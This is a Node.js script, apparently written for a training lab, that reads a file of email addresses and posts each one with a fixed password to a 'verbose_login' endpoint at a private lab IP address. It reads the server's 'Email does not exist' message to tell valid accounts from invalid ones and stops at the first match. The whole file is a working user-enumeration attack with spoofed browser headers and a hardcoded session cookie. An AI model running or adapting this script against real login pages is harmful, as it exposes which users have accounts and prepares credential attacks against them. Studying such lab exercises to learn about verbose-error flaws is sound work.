import fs from 'node:fs/promises';

const emailListFilePath = process.argv[2];

if (!emailListFilePath) {
    throw new Error("Email list file path not provided!");
}

async function enumerateEmail(emailFile) {
    if (!emailFile) {
        throw new Error("Email file not provided!");
    }

    // Read email list
    const text = await fs.readFile(emailFile, { encoding: "utf-8" });
    // Split by newline and filter out empty lines
    const arrayOfEmails = text.split("\n").map(e => e.trim()).filter(Boolean);
    let attempt = 0;
    // Use a for...of loop to properly handle async/await sequentially
    for (const email of arrayOfEmails) {
        const headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            // Content-Length removed so fetch calculates it dynamically
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=htjn2gi594r2iltri35m8q700a",
            "Pragma": "no-cache",
            "Sec-GPC": "1",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        };

        // Format data as URL-encoded to match Content-Type
        const bodyData = new URLSearchParams({
            'username': email,
            'password': 'password',
            'function': 'login'
        });

        try {
            const response = await fetch("http://10.48.166.66/labs/verbose_login/functions.php", {
                method: "POST",
                headers: headers,
                body: bodyData.toString(), // URL-encoded string
            });

            if (!response.ok) {
                console.error(`HTTP error! status: ${response.status}`);
                continue;
            }

            const jsonResponse = await response.json();
            if (jsonResponse["message"] === "Email does not exist") {
                console.log("--------------------")
                console.log(`Attempt Count - ${attempt++}`)
                console.log(`INVALID EMAIL- [${email}]`);
                console.log("--------------------")
                continue;
            }
            console.log("--------------------")
            console.log(`Attempt Count - ${attempt++}`)
            console.log(`VALID EMAIL FOUND- [${email}]`);
            console.log("--------------------")
            break;
        } catch (error) {
            console.error(`Error processing email ${email}:`, error.message);
        }
    }
}

await enumerateEmail(emailListFilePath);